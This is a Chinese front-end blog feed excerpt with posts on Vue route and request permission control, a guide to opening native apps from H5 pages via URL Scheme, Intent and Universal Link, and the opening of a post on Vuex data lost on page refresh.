<p>举例来说， 系统管理员和企业管理员都有一个叫做 “ 账号管理 “ 的路由，但他们的操作对象不同，实际上这就是两个完全不同的路由，所以路由的 name 肯定要有所区分。</p>
<p>为了能在前端导航菜单上都能显示 “ 账号管理 “ 这个名字，我们可以为路由再起一个别名，放进<code>meta.name</code>，生成导航菜单时优先展示别名就可以了。</p>
<h3 id="视图控制-1"><a href="#视图控制-1" class="headerlink" title="视图控制"></a>视图控制</h3><h4 id="全局验证方法"><a href="#全局验证方法" class="headerlink" title="全局验证方法"></a>全局验证方法</h4><p>验证方法的的实现本身很简单，全局混入一个<code>$_has()</code>方法，内部实现无非是将所需权限与拥有权限做比对，返回一个布尔值。重点在于工程实践上的优化，怎么能让这件事做起来更方便，通常的做法可能是下面这样的：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;$_has(&#x27;delete,/people&#x27;)&quot;</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>像这样的按钮一个页面上可能有多个，每个页面都需要手动的去维护权限信息，而且过程中还要频繁的在模板和脚本之间、当前组件文件和 api 文件之间来回切换，去查阅每一个权限对应资源的 url 和方法具体是什么。</p>
<p>这样的流程显然非常容易出错，开发体验也很不好。</p>
<p>经过摸索和总结，最终使用的方案是将权限信息和请求 api 维护在一起，组成一个资源对象，验证方法接收资源对象为参数，方法内部自动获取对象中的权限信息用做验证。</p>
<p>这样做的好处是在写资源的请求方法时可以顺手维护上资源的权限信息，这样一来在前端模板中就不需要出现具体的权限信息，只要给到这个资源对象的名称就行了，另外权限验证方法应该允许多个权限联合验证，所以将参数格式改成数组。</p>
<p>最终用法是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div v-if=&quot;$_has([people.delete])&quot; @click=&quot;people.delete.r()&quot;&gt;删除&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import * as people from &#x27;../api/people&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>资源对象示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &#x27;../api/people&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">delete</span> = &#123;</span><br><span class="line">  <span class="attr">p</span>: [<span class="string">&#x27;delete,/people&#x27;</span>], <span class="comment">// 资源权限</span></span><br><span class="line">  <span class="attr">r</span>: <span class="function"><span class="params">params</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> instance.<span class="title function_">delete</span>(<span class="string">&#x27;/people&#x27;</span>) <span class="comment">// 资源请求方法</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> = &#123;</span><br><span class="line">  <span class="keyword">delete</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>验证方法的实现比较简单就不展开了，将权限验证方法全局混入就可以在项目中很容易的配合 v-if 实现元素显示控制，v-if 这种方式的优点在于除了可以校验权限外，还可以在表达式中结合业务数据做更多样性的判断，从而实现随业务变化的动态视图控制。</p>
<h4 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h4><p>v-if 的响应特性是把双刃剑，因为表达式在应用运行过程中会频繁触发，但实际上在一个用户的会话周期内其权限极少会发生变化，v-if 产生的大量运算都是不必要的，多数时候我们希望只在视图载入时做一次校验决定元素的去留，这个需求可以通过自定义指令实现：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;has&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">bind</span>: <span class="keyword">function</span> (<span class="params">el, binding</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.$_has(binding.<span class="property">value</span>)) &#123;</span><br><span class="line">      el.<span class="property">parentNote</span>.<span class="title function_">removeChild</span>(el)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>自定义指令内部仍然是调用全局验证方法，但优点在于只会在元素初始化时执行一次，多数情况都应该使用自定义指令实现界面元素的权限控制。</p>
<h3 id="请求控制-1"><a href="#请求控制-1" class="headerlink" title="请求控制"></a>请求控制</h3><p>请求控制是利用 axios 拦截器实现的，原理是在请求拦截器中获取本次请求的 url 和 method 信息，再与资源权限数据做比对，判断请求是否合法从而决定是否拦截。</p>
<p>普通请求很容易处理，遍历资源权限数据，直接判断<code>request.method</code>和<code>request.url</code>是否吻合就可以了。对于带参数的 url 就不能用全文匹配了，而应该用模式匹配，这里需要前后端先协商一致。</p>
<p>后端返回的资源权限数据中，需要将 url 的参数用通配符代替，前端的请求拦截器中也要将带参数 url 处理成跟后端一致的格式，这样才能正确校验这类 url，例如以下这两种常见的参数格式及其代替写法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. url: /resources/1</span><br><span class="line">   权限: /resources/**</span><br><span class="line">   解释: 一个名词后缀跟一个参数，参数通常表示名词的ID</span><br><span class="line">2. url: /store/1/member</span><br><span class="line">   权限: /store/*/member</span><br><span class="line">   解释: 两个名词之间夹带一个参数，参数通常表示第一个名词的ID</span><br></pre></td></tr></table></figure>

<p>格式的匹配和参数替换可以用正则表达式实现，可能遇到的一个问题是，如果你要发起一个 url 为 “&#x2F;aaa&#x2F;bbb” 的请求，默认会匹配为上述第一种格式，然后被处理成 “&#x2F;aaa&#x2F;**” 进行权限校验。</p>
<p>如果这里的 “bbb” 并不是参数而是 url 的一部分，那么你可以将 url 改成 “&#x2F;aaa&#x2F;bbb&#x2F;“，在最后加一个 “&#x2F;“ 以绕过格式匹配。</p>
<p>如果你的项目还需要其他的通配符格式，只需要在拦截器中实现对应的匹配和转化方法就可以了。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://github.com/tower1229/Vue-Access-Control">Vue-Access-Control</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>权限</tag>
      </tags>
  </entry>
  <entry>
    <title>H5唤起APP指南</title>
    <url>/2022/09/23/20220923-H5%E5%94%A4%E8%B5%B7APP%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>前一段时间在做电流 App H5 页面，需求中落地页占比较大，落地页承担的职责就是引流。引流有两种形式，同时也是我们对唤端的定义：引导已下载用户打开 APP，引导未下载用户下载 APP。</p>
<p><img src="https://cdn.huatree.top/image-20220923111058551.png" alt="image-20220923111058551"></p>
<span id="more"></span>

<div class="note info"><p>文章转载自<a href="https://suanmei.github.io/">拾壹小筑</a></p>
</div>

<p>引导已下载用户打开 APP，从数据上说用户停留在 APP 中的时间更多了，是在提高用户粘性；从体验上说，APP 体验是要比 H5 好的。引导未下载用户下载 APP，可以增加我们的用户量。</p>
<p>上面其实分别解释了 <strong>什么是唤端</strong> 以及 <strong>为什么要唤端</strong>，也就是 <em>3W 法则</em> 中的 What 和 Why，那么接下来我们就要聊一聊 How 了，也就是 <strong>如何唤端</strong> 。</p>
<p>我们先来看看常见的唤端方式以及他们适用的场景。</p>
<h2 id="唤端媒介"><a href="#唤端媒介" class="headerlink" title="唤端媒介"></a>唤端媒介</h2><h3 id="URL-Scheme"><a href="#URL-Scheme" class="headerlink" title="URL Scheme"></a>URL Scheme</h3><h4 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h4><p>我们的手机上有许多私密信息，联系方式、照片、银行卡信息…我们不希望这些信息可以被手机应用随意获取到，信息泄露的危害甚大。所以，如何保证个人信息在设备所有者知情并允许的情况下被使用，是智能设备的核心安全问题。</p>
<p>对此，苹果使用了名为 <em>沙盒</em> 的机制：应用只能访问它声明可能访问的资源。但沙盒也阻碍了应用间合理的信息共享，某种程度上限制了应用的能力。</p>
<p>因此，我们急需要一个辅助工具来帮助我们实现应用通信， URL Scheme 就是这个工具。</p>
<h4 id="URL-Scheme-是什么"><a href="#URL-Scheme-是什么" class="headerlink" title="URL Scheme 是什么"></a>URL Scheme 是什么</h4><p>我们来看一下 URL 的组成：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[scheme:][//authority][path][?query][<span class="comment">#fragment]</span></span><br></pre></td></tr></table></figure>

<p>我们拿 <code>https://www.baidu.com</code> 来举例，scheme 自然就是 <code>https</code> 了。</p>
<p>就像给服务器资源分配一个 URL，以便我们去访问它一样，我们同样也可以给手机 APP 分配一个特殊格式的 URL，用来访问这个 APP 或者这个 APP 中的某个功能(来实现通信)。APP 得有一个标识，好让我们可以定位到它，它就是 URL 的 Scheme 部分。</p>
<h4 id="常用-APP-的-URL-Scheme"><a href="#常用-APP-的-URL-Scheme" class="headerlink" title="常用 APP 的 URL Scheme"></a>常用 APP 的 URL Scheme</h4><table>
<thead>
<tr>
<th align="center">APP</th>
<th align="center">微信</th>
<th align="center">支付宝</th>
<th align="center">淘宝</th>
<th align="center">微博</th>
<th align="center">QQ</th>
<th align="center">知乎</th>
<th align="center">短信</th>
</tr>
</thead>
<tbody><tr>
<td align="center">URL Scheme</td>
<td align="center">weixin:&#x2F;&#x2F;</td>
<td align="center">alipay:&#x2F;&#x2F;</td>
<td align="center">taobao:&#x2F;&#x2F;</td>
<td align="center">sinaweibo:&#x2F;&#x2F;</td>
<td align="center">mqq:&#x2F;&#x2F;</td>
<td align="center">zhihu:&#x2F;&#x2F;</td>
<td align="center">sms:&#x2F;&#x2F;</td>
</tr>
</tbody></table>
<h4 id="URL-Scheme-语法"><a href="#URL-Scheme-语法" class="headerlink" title="URL Scheme 语法"></a>URL Scheme 语法</h4><p>上面表格中都是最简单的用于打开 APP 的 URL Scheme，下面才是我们常用的 URL Scheme 格式：</p>
<figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line">行为(应用的某个功能)</span><br><span class="line">            |</span><br><span class="line">scheme:<span class="comment">//[path][?query]</span></span><br><span class="line">   |               |</span><br><span class="line">应用标识       功能需要的参数</span><br></pre></td></tr></table></figure>

<h3 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h3><p>安卓的原生谷歌浏览器自从 chrome25 版本开始对于唤端功能做了一些变化，URL Scheme 无法再启动 Android 应用。 例如，通过 iframe 指向 <code>weixin://</code>，即使用户安装了微信也无法打开。所以，APP 需要实现谷歌官方提供的 <code>intent:</code> 语法，或者实现让用户通过自定义手势来打开 APP，当然这就是题外话了。</p>
<h4 id="Intent-语法"><a href="#Intent-语法" class="headerlink" title="Intent 语法"></a>Intent 语法</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">intent:</span></span><br><span class="line">   <span class="string">HOST/URI-path</span> <span class="string">//</span> <span class="string">Optional</span> <span class="string">host</span></span><br><span class="line">   <span class="comment">#Intent;</span></span><br><span class="line">      <span class="string">package=[string];</span></span><br><span class="line">      <span class="string">action=[string];</span></span><br><span class="line">      <span class="string">category=[string];</span></span><br><span class="line">      <span class="string">component=[string];</span></span><br><span class="line">      <span class="string">scheme=[string];</span></span><br><span class="line">   <span class="string">end;</span></span><br></pre></td></tr></table></figure>

<p>如果用户未安装 APP，则会跳转到系统默认商店。当然，如果你想要指定一个唤起失败的跳转地址，添加下面的字符串在 <code>end;</code> 前就可以了:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">S.browser_fallback_url=[encoded_full_url]</span></span><br></pre></td></tr></table></figure>

<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>下面是打开 Zxing 二维码扫描 APP 的 intent。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">intent:</span></span><br><span class="line">   <span class="string">//scan/</span></span><br><span class="line">   <span class="comment">#Intent;</span></span><br><span class="line">      <span class="string">package=com.google.zxing.client.android;</span></span><br><span class="line">      <span class="string">scheme=zxing;</span></span><br><span class="line">   <span class="string">end;</span></span><br></pre></td></tr></table></figure>

<p>打开这个 APP ，可以通过如下的方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;S.browser_fallback_url=http%3A%2F%2Fzxing.org;end&quot;</span>&gt;</span></span><br><span class="line">  Take a QR code</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Universal-Link"><a href="#Universal-Link" class="headerlink" title="Universal Link"></a>Universal Link</h3><h4 id="Universal-Link-是什么"><a href="#Universal-Link-是什么" class="headerlink" title="Universal Link 是什么"></a>Universal Link 是什么</h4><p>Universal Link 是苹果在 WWDC2015 上为 iOS9 引入的新功能，通过传统的 HTTP 链接即可打开 APP。如果用户未安装 APP，则会跳转到该链接所对应的页面。</p>
<h4 id="为什么要使用-Universal-Link"><a href="#为什么要使用-Universal-Link" class="headerlink" title="为什么要使用 Universal Link"></a>为什么要使用 Universal Link</h4><p>传统的 Scheme 链接有以下几个痛点：</p>
<ul>
<li>在 ios 上会有确认弹窗提示用户是否打开，对于用户来说唤端，多出了一步操作。若用户未安装 APP ，也会有一个提示窗，告知我们 “打不开该网页，因为网址无效”</li>
<li>传统 Scheme 跳转无法得知唤端是否成功，Universal Link 唤端失败可以直接打开此链接对应的页面</li>
<li>Scheme 在微信、微博、QQ 浏览器、手百中都已经被禁止使用，使用 Universal Link 可以避开它们的屏蔽（ 截止到 18 年 8 月 21 日，微信和 QQ 浏览器已经禁止了 Universal Link，其他主流 APP 未发现有禁止 ）</li>
</ul>
<h4 id="如何让-APP-支持-Universal-Link"><a href="#如何让-APP-支持-Universal-Link" class="headerlink" title="如何让 APP 支持 Universal Link"></a>如何让 APP 支持 Universal Link</h4><p>有大量的文章会详细的告诉我们如何配置，你也可以去看<a href="https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html#//apple_ref/doc/uid/TP40016308-CH12-SW2">官方文档</a>，我这里简单的写一个 12345。</p>
<ol>
<li>拥有一个支持 <strong>https</strong> 的域名</li>
<li>在 <a href="https://developer.apple.com/">开发者中心</a> ，Identifiers 下 AppIDs 找到自己的 App ID，编辑打开 Associated Domains 服务。</li>
<li>打开工程配置中的 Associated Domains ，在其中的 Domains 中填入你想支持的域名，必须以 <code>applinks:</code> 为前缀</li>
<li>配置 <code>apple-app-site-association</code> 文件，文件名必须为 <code>apple-app-site-association</code> ，<strong>不带任何后缀</strong></li>
<li>上传该文件到你的 HTTPS 服务器的 <strong>根目录</strong> 或者 <code>.well-known</code> 目录下</li>
</ol>
<h4 id="Universal-Link-配置中的坑"><a href="#Universal-Link-配置中的坑" class="headerlink" title="Universal Link 配置中的坑"></a>Universal Link 配置中的坑</h4><p>这里放一下我们在配置过程中遇到的坑，当然首先你在配置过程中必须得严格按照上面的要求去做，尤其是加粗的地方。</p>
<ol>
<li><p>域名问题</p>
<p>Universal Link 支持的域名最多只能支持到二级域名，如果你用到了三级域名，Universal Link 唤端是不会生效的。</p>
</li>
<li><p>跨域问题</p>
<p>IOS 9.2 以后，必须要触发跨域才能支持 Universal Link 唤端。</p>
<p>IOS 那边有这样一个判断，如果你要打开的 Universal Link 和 当前页面是同一域名，ios 尊重用户最可能的意图，直接打开链接所对应的页面。如果不在同一域名下，则在你的 APP 中打开链接，也就是执行具体的唤端操作。</p>
</li>
<li><p>Universal Link 是空页面</p>
<p>Universal Link 本质上是个空页面，如果未安装 APP，Universal Link 被当做普通的页面链接，自然会跳到 404 页面，所以我们需要将它绑定到我们的中转页或者下载页。</p>
</li>
</ol>
<h2 id="如何调用三种唤端媒介"><a href="#如何调用三种唤端媒介" class="headerlink" title="如何调用三种唤端媒介"></a>如何调用三种唤端媒介</h2><p>通过前面的介绍，我们可以发现，无论是 URL Scheme 还是 Intent 或者 Universal Link ，他们都算是 URL ，只是 URL Scheme 和 Intent 算是特殊的 URL。所以我们可以拿使用 URL 的方法来使用它们。</p>
<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;sinaweibo://qrcode&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在只有 URL Scheme 的日子里，iframe 是使用最多的了。因为在未安装 app 的情况下，不会去跳转错误页面。但是 iframe 在各个系统以及各个应用中的兼容问题还是挺多的，不能全部使用 URL Scheme。</p>
<h3 id="a-标签"><a href="#a-标签" class="headerlink" title="a 标签"></a>a 标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end&quot;</span>&quot;&gt;</span>扫一扫<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><del>前面我们提到 Intent 协议，官方给出的用例使用的就是使用的 a 标签，所以我们跟着一起用就可以了</del>。</p>
<p>使用过程中，对于动态生成的 a 标签，使用 <code>dispatch</code> 来模拟触发点击事件，发现很多种 event 传递过去都无效；使用 <code>click()</code> 来模拟触发，部分场景下存在这样的情况，第一次点击过后，回到原先页面，再次点击，点击位置和页面所识别位置有不小的偏移，所以 Intent 协议从 a 标签换成了 window.location。</p>
<h3 id="window-location"><a href="#window-location" class="headerlink" title="window.location"></a>window.location</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;sinaweibo://qrcode&#x27;</span></span><br></pre></td></tr></table></figure>

<p>URL Scheme 在 ios 9+ 上诸如 safari、UC、QQ 浏览器中， iframe 均无法成功唤起 APP，只能通过 window.location 才能成功唤端。</p>
<p>当然，如果我们的 app 支持 Universal Link，ios 9+ 就用不到 URL Scheme 了。而 Universal Link 在使用过程中，我发现在 qq 中，无论是 iframe 导航 还是 a 标签打开 又或者 window.location 都无法成功唤端，一开始我以为是 qq 和微信一样禁止了 Universal Link 唤端的功能，其实不然，百般试验下，通过 top.location 唤端成功了。</p>
<h2 id="判断唤端是否成功"><a href="#判断唤端是否成功" class="headerlink" title="判断唤端是否成功"></a>判断唤端是否成功</h2><p>如果唤端失败（APP 未安装），我们总是要做一些处理的，可以是跳转下载页，可以是 ios 下跳转 App Store… 但是 Js 并不能提供给我们获取 APP 唤起状态的能力，Android Intent 以及 Universal Link 倒是不用担心，它们俩的自身机制允许它们唤端失败后直接导航至相应的页面，但是 URL Scheme 并不具备这样的能力，所以我们只能通过一些很 hack 的方式来实现 APP 唤起检测功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initialTime = <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line"><span class="keyword">let</span> counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> waitTime = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> checkOpen = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  count++</span><br><span class="line">  waitTime = <span class="keyword">new</span> <span class="title class_">Date</span>() - initialTime</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (waitTime &gt; <span class="number">2500</span>) &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(checkOpen)</span><br><span class="line">    <span class="title function_">cb</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (counter &lt; <span class="number">100</span>) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> hide = <span class="variable language_">document</span>.<span class="property">hidden</span> || <span class="variable language_">document</span>.<span class="property">webkitHidden</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!hide) &#123;</span><br><span class="line">    <span class="title function_">cb</span>() <span class="comment">// 唤端失败的回调函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<p>APP 如果被唤起的话，页面就会进入后台运行，setInterval 在 ios 中不会停止运行，在 android 中停止运行。</p>
<p>每 20ms 执行一次，执行 100 次 在页面中实际耗费与 2000 ms 不会相差多少。</p>
<p>我们的判断条件比预期时间多设置了 500ms，所以如果安卓中 setInterval 内的函数执行 100 次以内所费时间超过 2500ms，则说明 APP 唤起成功，反之则代表失败。</p>
<p>我们通过 document.hidden 和 document.webkitHidden 属性来判断 APP 在 ios 中是否被正常唤起，2000ms 内，页面转入后台运行，document.hidden 会返回 true，代表唤端成功，反之则代表失败。</p>
<h2 id="没有完美的方案"><a href="#没有完美的方案" class="headerlink" title="没有完美的方案"></a>没有完美的方案</h2><p>透过上面的几个点，我们可以发现，无论是 <em>唤端媒介</em> 、 <em>调用唤端媒介</em> 还是 <em>判断唤端结果</em> 都没有一个十全十美的方法，我们在代码层上能做的只是在确保最常用的场景（比如 微信、微博、UC 等）唤端无误的情况下，最大化的兼容剩余的场景。</p>
<p>好的，我们接下来扯一些代码以外的，让我们的 APP 能够在更多的平台唤起。</p>
<ul>
<li><p>微信、微博、手百、QQ 浏览器等。</p>
<p>这些应用能阻止唤端是因为它们直接屏蔽掉了 URL Scheme 。接下来可能就有看官疑惑了，微信中是可以打开大众点评的呀，微博里面可以打开优酷呀，那是如何实现的呢？</p>
<p>它们都各自维护着一个白名单，如果你的域名在白名单内，那这个域名下所有的页面发起的 URL Scheme 就都会被允许。就像微信，如果你是腾讯的“家属”，你就可以加入白名单了，微信的白名单一般只包含着“家属”，除此外很难申请到白名单资质。但是微博之类的都是可以联系他们的渠道童鞋进行申请的，只是条件各不相同，比如微博的就是在你的 APP 中添加打开微博的入口，三个月内唤起超过 100w 次，就可以加入白名单了。</p>
</li>
<li><p>腾讯应用宝直接打开 APP 的某个功能</p>
<p>刚刚我们说到，如果你不是微信的家属，那你是很难进入白名单的，所以在安卓中我们一般都是直接打开腾讯应用宝，ios 中 直接打开 App Store。点击腾讯应用宝中的“打开”按钮，可以直接唤起我们的 APP，但是无法打开 APP 中的某个功能（就是无法打开指定页面）。</p>
<p>腾讯应用宝对外开放了一个叫做 APP Link 的申请，只要你申请了 APP Link，就可以通过在打开应用宝的时候在应用宝地址后面添加上 <code>&amp;android_schema=&#123;your_scheme&#125;</code> ，来打开指定的页面了。</p>
</li>
</ul>
<h2 id="开箱即用的-callapp-lib"><a href="#开箱即用的-callapp-lib" class="headerlink" title="开箱即用的 callapp-lib"></a>开箱即用的 callapp-lib</h2><p>信息量很大！各种问题得自己趟坑验证！内心很崩溃！</p>
<p>不用愁，已经为你准备好了药方，只需照方抓药即可 😏 —— npm 包 <a href="https://www.npmjs.com/package/callapp-lib">callapp-lib</a></p>
<p>它能在大部分的环境中成功唤端，而且炒鸡简单啊，拿过去就可以用啊，还支持很多扩展功能啊，快来瞅瞅它的 <a href="https://github.com/suanmei/callapp-lib">文档</a> 啊~~~</p>
<h2 id="相关链接文章"><a href="#相关链接文章" class="headerlink" title="相关链接文章"></a>相关链接文章</h2><p>[1] <a href="http://web.jobbole.com/86706/">浏览器中唤起 native app，否则跳转到应用商城下载</a><br>[2] <a href="http://echozq.github.io/echo-blog/2015/11/13/callapp.html">h5 唤起 app</a><br>[3] <a href="https://sspai.com/post/31500">URL Schemes 使用详解</a><br>[4] <a href="https://developer.chrome.com/multidevice/android/intents">Android Intents with Chrome</a><br>[5] <a href="https://blog.csdn.net/xttxqjfg/article/details/76019824">常用 URL Scheme</a><br>[6] <a href="http://www.cocoachina.com/ios/20170904/20463.html">Universal Link 前端部署采坑记</a><br>[7] <a href="https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html#//apple_ref/doc/uid/TP40016308-CH12-SW2">Support Universal Links</a><br>[8] <a href="https://yq.aliyun.com/articles/608583">Universal Link 是个骗子</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>webview</tag>
        <tag>native</tag>
        <tag>URL Scheme</tag>
        <tag>Universal Link</tag>
        <tag>Intent</tag>
        <tag>唤端</tag>
        <tag>APP</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue页面刷新路由传参与vuex数据丢失</title>
    <url>/2022/09/28/20220928-Vue%E9%A1%B5%E9%9D%A2%E5%88%B7%E6%96%B0%E8%B7%AF%E7%94%B1%E5%8F%82%E6%95%B0%E4%B8%8Evuex%E7%8A%B6%E6%80%81%E4%B8%A2%E5%A4%B1/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220928175435071.png" alt="image-20220928175435071"></p>
<span id="more"></span>

<h2 id="Vuex-刷新页面数据丢失"><a href="#Vuex-刷新页面数据丢失" class="headerlink" title="Vuex 刷新页面数据丢失"></a>Vuex 刷新页面数据丢失</h2><h3 id="为什么刷新页面-Vuex-的数据会丢失"><a href="#为什么刷新页面-Vuex-的数据会丢失" class="headerlink" title="为什么刷新页面 Vuex 的数据会丢失"></a>为什么刷新页面 Vuex 的数据会丢失</h3><p>刷新页面 Vuex 的数据会丢失属于正常现象，因为 JS 的数据都是保存在浏览器的堆栈内存里面的，刷新浏览器页面，以前堆栈申请的内存被释放，这就是浏览器的运行机制，那么堆栈里的数据自然就清空了。</p>
<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><ul>
<li>Storage</li>
<li>第三方 npm 包</li>
</ul>
<h4 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h4><p>推荐 sessionStorage，也可以用 localStorage，但是它没有期限；所以常用的还是 sessionStorage，当浏览器关闭时会话结束。将需要的数据存入 vuex 的 store 里，也将该数据存入 sessionStorage 里。</p>
<p>注意：vuex 中的变量是响应式的，而 sessionStorage 不是，当你改变 vuex 中的状态，组件会检测到改变，而 sessionStorage 就不会了，页面要重新刷新才可以看到改变，所以应让 vuex 中的状态从 sessionStorage 中得到，这样组件就可以响应式的变化。</p>
<p><strong>示例</strong>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  <span class="attr">authInfo</span>: <span class="title class_">JSON</span>.<span class="title function_">parse</span>(sessionStorage.<span class="title function_">getItem</span>(<span class="string">&#x27;COMPANY_AUTH_INFO&#x27;</span>)) || &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">  <span class="attr">authInfo</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">authInfo</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">  <span class="title function_">SET_COMPANY_AUTH_INFO</span>(<span class="params">state, data</span>) &#123;</span><br><span class="line">    state.<span class="property">authInfo</span> = data</span><br><span class="line">    sessionStorage.<span class="title function_">setItem</span>(<span class="string">&#x27;COMPANY_AUTH_INFO&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//actions 模块里无需使用 sessionStorage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  getters,</span><br><span class="line">  mutations</span><br><span class="line">  <span class="comment">//actions,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第三方-npm-包"><a href="#第三方-npm-包" class="headerlink" title="第三方 npm 包"></a>第三方 npm 包</h4><p>1、<a href="https://www.npmjs.com/package/vuex-along">vuex-along</a></p>
<p>2、<a href="https://www.npmjs.com/package/vue-persistedstate">vuex-persistedstate</a></p>
<p>3、<a href="https://www.npmjs.com/package/vuex-persist">vuex-persist</a></p>
<h2 id="Vue-路由传参页面刷新参数丢失"><a href="#Vue-路由传参页面刷新参数丢失" class="headerlink" title="Vue 路由传参页面刷新参数丢失"></a>Vue 路由传参页面刷新参数丢失</h2><p>常见场景：点击列表的详情，跳转到详情页，在该页根据传递的参数获取详情数据。</p>
<p>这里的路由当然是 Vue Router 了。</p>
<h3 id="不修改路由配置"><a href="#不修改路由配置" class="headerlink" title="不修改路由配置"></a>不修改路由配置</h3><p>使用 sessionStorage 来马上缓存(通常在 created 钩子函数中)获得的路由参数，这种方法要自己把握好什么时候 set，什么时候 get，什么时候 remove。</p>
<h3 id="配置路由参数"><a href="#配置路由参数" class="headerlink" title="配置路由参数"></a>配置路由参数</h3><p>单个参数优先考虑使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/detail/:id&#x27;</span>,  <span class="comment">//若id后面加?代表这个参数是可选的</span></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Detail</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 $router.push 中 path 携带参数的方式</p>
